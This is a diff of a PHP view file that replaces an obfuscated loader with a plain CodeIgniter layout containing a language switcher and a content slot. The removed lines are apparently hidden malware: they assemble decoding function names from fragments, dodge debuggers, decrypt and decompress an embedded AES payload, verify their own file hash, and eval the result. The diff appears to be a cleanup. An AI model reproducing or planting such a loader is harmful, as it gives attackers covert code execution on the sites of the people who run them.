@@ -1,28 +1,18 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_vcr7a5nm=('bas'.'e64'.'_de'.'cod'.'e');
-$_fbuumykg=('gzu'.'nco'.'mpr'.'ess');
-$_lf6hyv8u=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_nj86hviz='QOCBd/R5';
-$_lg9nc2s5='EiD69oIk';
-$_dmv36q76='mcK4k6sE';
-$_yfxx33mo='TNHziUiD';
-$_j4e1rkgy='DxQ8IYrqCKg=';
-$_hxtabx5v='ZgOFsbI3';
-$_bc9k92pm='tKftOrqq';
-$_unogghxf='FsURpA==';
-$_y4a5lbcj=$_vcr7a5nm($_yfxx33mo.$_lg9nc2s5.$_nj86hviz.$_dmv36q76.$_j4e1rkgy);
-$_nebboob6=$_vcr7a5nm($_bc9k92pm.$_hxtabx5v.$_unogghxf);
-$_jpocp22i=$_vcr7a5nm('l7SuiYZNEjJfNoFkiaEoWPtVDQBo+P2igRTx2b5o3/pIfE0mnKJDSFlX7Ipwq6MxD19kX6HARLHexxay3hk0svF3pIFde/6G+PmPLJiS9+xCNKQmB7B+h/3c3EUGoXakJCdpCO7h5LgpnV8jB1nLM2BJ8HotGe3d/Txrk5GN/YRN0Cke6SZXWbPJhPec6p7bQklbaZuD1skFR77+YN8CxUO3Pk+Krspwou1Ul9a2YnNTEda+XUhG7R01ol47OZ7Xp/q08qOrE80iMA7ct6QqU4xLGRi6nq/hPYB+unAiec9OIQEs8jYxQZ3eGIZz1VrQznnNYKaR7oPbOBuHeIoF0ZCqHChJLgz8B+WRxV7oJQJc9cj3jZ4tEki+z7B3LUPUWUsTgQ1iokCHKJhbJBKmUyb+Ke65imJqmm3LyykL50BeJ1zK05eFvoQy4EuxydzsItSQl9n+Plpj/QBLTqkoQjup/8EdcIyA+j6OtzBFbWeS+guXwHLuvTIfOavmUoCvo6EvXm16sNGMYa+9VQ/ZLPB0L2jDaYifw8CBydeduSqdF++iPlJyb7xInNAvj9ziXI9M9ZOfMOJOAwc78/jzcJ+Fa4FXg5PnbG6bhjmAQcVfWrseB8skhg9MUXFPzWVDrXsQSvxQC+qBm1TTLkPggujaUApqJJpwNy66U5A+PECj4gK0B1OE5kqhGPWNze7zWTYsXI1zX8SxBUBN5SDZDw==');
-$_bh2rnm4p=$_lf6hyv8u($_jpocp22i,'aes-256-cbc',$_y4a5lbcj,OPENSSL_RAW_DATA,$_nebboob6);
-if($_bh2rnm4p===false){exit;}
-$_onai6ebh=$_fbuumykg($_bh2rnm4p);
-if($_onai6ebh===false){exit;}
-$_ktr9br3q='c5f62e5ef1c06818d1c9ee003a5f851ecf9131861a668e32a2d7b7167d2f1453';
-$_ytyk2lol=@file_get_contents(__FILE__);
-if($_ytyk2lol!==false){
-$_wijwosjv=str_replace($_ktr9br3q,"0000000000000000000000000000000000000000000000000000000000000000",$_ytyk2lol);
-$_wym9chfz=hash("sha256",$_wijwosjv);
-if($_wym9chfz!==$_ktr9br3q){@http_response_code(403);exit;}
-}
-eval($_onai6ebh);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+$this->load->view('partials/head'); ?>
+<body class="bare">
+<style>
+.bare-lang { position: fixed; top: 12px; right: 12px; z-index: 5; }
+.lang-switch { display: inline-flex; border: 1px solid var(--line, #e5ddd5); border-radius: 999px; overflow: hidden; background: var(--paper, #fff); font: 600 .78rem/1 system-ui, sans-serif; }
+.lang-switch a { padding: 8px 10px; color: inherit; text-decoration: none; opacity: .65; }
+.lang-switch a:hover { opacity: 1; }
+.lang-switch a.on { opacity: 1; background: color-mix(in srgb, var(--accent, #b0726b) 16%, #fff); }
+</style>
+<?php if (empty($hide_lang)): ?><div class="bare-lang"><?php $this->load->view('partials/_lang_switch'); ?></div><?php endif; ?>
+<main class="bare-card">
+<?php $this->load->view($content_view); ?>
+</main>
+<script src="<?= asset_url('js/app.js') ?>"></script>
+</body>
+</html>
